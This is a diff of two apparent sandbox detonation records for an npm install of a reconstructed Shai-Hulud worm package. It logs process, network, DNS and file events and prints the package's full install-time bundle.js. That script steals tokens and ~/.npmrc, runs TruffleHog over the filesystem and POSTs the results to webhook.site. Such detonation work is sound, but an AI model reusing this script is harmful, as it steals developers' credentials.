@@ -1,13 +1,13 @@
 {
- "job_id": "a4ddbe2f-0646-479b-ae49-0a7facf457ea",
+ "job_id": "0e5ce911-ed75-4695-8baf-2d1abbb251ef",
  "status": "completed",
  "exit_code": 0,
- "duration_s": 9.45,
+ "duration_s": 9.4,
  "exec_events": [
   {
-   "ts": "2026-11-01T16:02:06.083806915Z",
-   "pid": 56044,
-   "ppid": 56015,
+   "ts": "2026-11-01T23:12:07.617437730Z",
+   "pid": 80186,
+   "ppid": 80161,
    "binary": "/usr/local/bin/docker-entrypoint.sh",
    "args": "/usr/local/bin/docker-entrypoint.sh npm install --no-audit --no-fund --prefix payloads/r02-shai-hulud",
    "parent_binary": "/usr/bin/containerd-shim-runc-v2",
@@ -15,9 +15,9 @@
    "cwd": "/work"
   },
   {
-   "ts": "2026-11-01T16:02:06.085764539Z",
-   "pid": 56044,
-   "ppid": 56044,
+   "ts": "2026-11-01T23:12:07.619078928Z",
+   "pid": 80186,
+   "ppid": 80186,
    "binary": "/usr/local/bin/npm",
    "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/r02-shai-hulud",
    "parent_binary": "/usr/local/bin/docker-entrypoint.sh",
@@ -25,9 +25,9 @@
    "cwd": "/work"
   },
   {
-   "ts": "2026-11-01T16:02:06.086739476Z",
-   "pid": 56044,
-   "ppid": 56044,
+   "ts": "2026-11-01T23:12:07.619782262Z",
+   "pid": 80186,
+   "ppid": 80186,
    "binary": "/usr/local/bin/node",
    "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/r02-shai-hulud",
    "parent_binary": "/usr/local/bin/npm",
@@ -35,9 +35,9 @@
    "cwd": "/work"
   },
   {
-   "ts": "2026-11-01T16:02:06.607252351Z",
-   "pid": 56098,
-   "ppid": 56044,
+   "ts": "2026-11-01T23:12:08.133465337Z",
+   "pid": 80238,
+   "ppid": 80186,
    "binary": "/usr/bin/sh",
    "args": "-c \"node bundle.js\"",
    "parent_binary": "/usr/local/bin/node",
@@ -45,9 +45,9 @@
    "cwd": "/work/payloads/r02-shai-hulud/node_modules/tinycolor-recon"
   },
   {
-   "ts": "2026-11-01T16:02:06.608158427Z",
-   "pid": 56099,
-   "ppid": 56098,
+   "ts": "2026-11-01T23:12:08.135246082Z",
+   "pid": 80239,
+   "ppid": 80238,
    "binary": "/usr/local/bin/node",
    "args": "bundle.js",
    "parent_binary": "/usr/bin/sh",
@@ -55,19 +55,19 @@
    "cwd": "/work/payloads/r02-shai-hulud/node_modules/tinycolor-recon"
   },
   {
-   "ts": "2026-11-01T16:02:07.129879193Z",
-   "pid": 56110,
-   "ppid": 56099,
+   "ts": "2026-11-01T23:12:08.627734402Z",
+   "pid": 80250,
+   "ppid": 80239,
    "binary": "/usr/bin/tar",
-   "args": "xzf /tmp/th-uG8YrG/th.tgz -C /tmp/th-uG8YrG",
+   "args": "xzf /tmp/th-A0Sj2D/th.tgz -C /tmp/th-A0Sj2D",
    "parent_binary": "/usr/local/bin/node",
    "uid": 10001,
    "cwd": "/work/payloads/r02-shai-hulud/node_modules/tinycolor-recon"
   },
   {
-   "ts": "2026-11-01T16:02:07.131696839Z",
-   "pid": 56111,
-   "ppid": 56110,
+   "ts": "2026-11-01T23:12:08.629388527Z",
+   "pid": 80251,
+   "ppid": 80250,
    "binary": "/usr/bin/gzip",
    "args": "-d",
    "parent_binary": "/usr/bin/tar",
@@ -75,10 +75,10 @@
    "cwd": "/work/payloads/r02-shai-hulud/node_modules/tinycolor-recon"
   },
   {
-   "ts": "2026-11-01T16:02:07.477393141Z",
-   "pid": 56112,
-   "ppid": 56099,
-   "binary": "/tmp/th-uG8YrG/trufflehog",
+   "ts": "2026-11-01T23:12:08.973197433Z",
+   "pid": 80252,
+   "ppid": 80239,
+   "binary": "/tmp/th-A0Sj2D/trufflehog",
    "args": "filesystem /work/payloads/r02-shai-hulud/node_modules/tinycolor-recon --json --no-update",
    "parent_binary": "/usr/local/bin/node",
    "uid": 10001,
@@ -87,57 +87,83 @@
  ],
  "connect_events": [
   {
-   "ts": "2026-11-01T16:02:06.701909144Z",
-   "pid": 56099,
+   "ts": "2026-11-01T23:12:08.235222356Z",
+   "pid": 80239,
    "binary": "/usr/local/bin/node",
-   "daddr": "140.82.114.4",
+   "daddr": "140.82.112.4",
    "dport": 443,
    "family": "AF_INET",
-   "resolved_domain": "github.com"
+   "resolved_domain": "github.com",
+   "protocol": "tcp"
   },
   {
-   "ts": "2026-11-01T16:02:06.718294098Z",
-   "pid": 56099,
+   "ts": "2026-11-01T23:12:08.252438938Z",
+   "pid": 80239,
    "binary": "/usr/local/bin/node",
-   "daddr": "185.199.111.133",
+   "daddr": "185.199.109.133",
    "dport": 443,
    "family": "AF_INET",
-   "resolved_domain": "release-assets.githubusercontent.com"
+   "resolved_domain": "release-assets.githubusercontent.com",
+   "protocol": "tcp"
   },
   {
-   "ts": "2026-11-01T16:02:10.049251206Z",
-   "pid": 56099,
+   "ts": "2026-11-01T23:12:11.550667905Z",
+   "pid": 80239,
    "binary": "/usr/local/bin/node",
    "daddr": "198.51.100.66",
    "dport": 443,
    "family": "AF_INET",
-   "resolved_domain": "webhook.site"
+   "resolved_domain": "webhook.site",
+   "protocol": "tcp"
   }
  ],
  "dns_queries": [
   {
-   "ts": "2026-11-01T16:02:06Z",
+   "ts": "2026-11-01T23:12:08Z",
    "domain": "github.com",
    "answers": [
-    "140.82.114.4"
+    "140.82.112.4"
    ]
   },
   {
-   "ts": "2026-11-01T16:02:06Z",
+   "ts": "2026-11-01T23:12:08Z",
    "domain": "release-assets.githubusercontent.com",
    "answers": [
-    "185.199.111.133",
-    "185.199.108.133",
     "185.199.109.133",
-    "185.199.110.133"
+    "185.199.110.133",
+    "185.199.108.133",
+    "185.199.111.133"
    ]
   },
   {
-   "ts": "2026-11-01T16:02:10Z",
+   "ts": "2026-11-01T23:12:11Z",
    "domain": "webhook.site",
    "answers": [
     "198.51.100.66"
    ]
+  }
+ ],
+ "file_events": [
+  {
+   "ts": "2026-11-01T23:12:07.732226326Z",
+   "pid": 80186,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  },
+  {
+   "ts": "2026-11-01T23:12:08.182237446Z",
+   "pid": 80239,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/r02-shai-hulud/node_modules/tinycolor-recon/bundle.js",
+   "package": "tinycolor-recon",
+   "sha256": "1a6259f184a3771bafc638c07bd4f9d17d2c1223242c965310faaccead2bc5a4",
+   "content": "// Reconstruction of the Shai-Hulud worm's bundle.js (npm, Sept 2025), defanged.\n// Published behavior: harvest tokens (env, ~/.npmrc), download the real TruffleHog from\n// GitHub releases, scan the filesystem for secrets, POST the results to webhook.site, then\n// use stolen npm/GitHub tokens to republish itself. Here: webhook.site is sinkholed by the\n// Chamber, the only \"secrets\" are its planted fakes, and the propagation step is omitted.\nconst https = require(\"https\"), fs = require(\"fs\"), os = require(\"os\"), path = require(\"path\");\nconst { execFileSync } = require(\"child_process\");\nconst dir = fs.mkdtempSync(path.join(os.tmpdir(), \"th-\"));\nconst tokens = [\"GITHUB_TOKEN\", \"NPM_TOKEN\", \"AWS_ACCESS_KEY_ID\"].filter((k) => process.env[k]);\nlet npmrc = \"\";\ntry { npmrc = fs.readFileSync(path.join(os.homedir(), \".npmrc\"), \"utf8\"); } catch (e) {}\nfunction get(url, dest, done, hops = 0) {\n  https.get(url, { headers: { \"User-Agent\": \"node\" } }, (res) => {\n    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && hops < 5) {\n      res.resume();\n      return get(res.headers.location, dest, done, hops + 1);\n    }\n    const out = fs.createWriteStream(dest);\n    res.pipe(out);\n    out.on(\"finish\", () => out.close(done));\n  }).on(\"error\", () => done());\n}\nget(\"https://github.com/trufflesecurity/trufflehog/releases/download/v3.99.7/trufflehog_3.99.7_linux_amd64.tar.gz\", path.join(dir, \"th.tgz\"), () => {\n  let findings = \"\";\n  try {\n    execFileSync(\"tar\", [\"xzf\", path.join(dir, \"th.tgz\"), \"-C\", dir]);\n    fs.chmodSync(path.join(dir, \"trufflehog\"), 0o755);\n    findings = execFileSync(path.join(dir, \"trufflehog\"),\n      [\"filesystem\", process.cwd(), \"--json\", \"--no-update\"], { timeout: 60000 }).toString();\n  } catch (e) {}\n  const req = https.request({ host: \"webhook.site\", method: \"POST\", timeout: 3000,\n    path: \"/00000000-0000-0000-0000-000000000000\" });\n  req.on(\"error\", () => {});\n  req.on(\"timeout\", () => req.destroy());\n  req.end(JSON.stringify({ tokens, npmrc, findings: findings.slice(0, 2000) }));\n});\n",
+   "truncated": false
   }
  ],
  "stdout_tail": "\nadded 1 package in 7s\n",
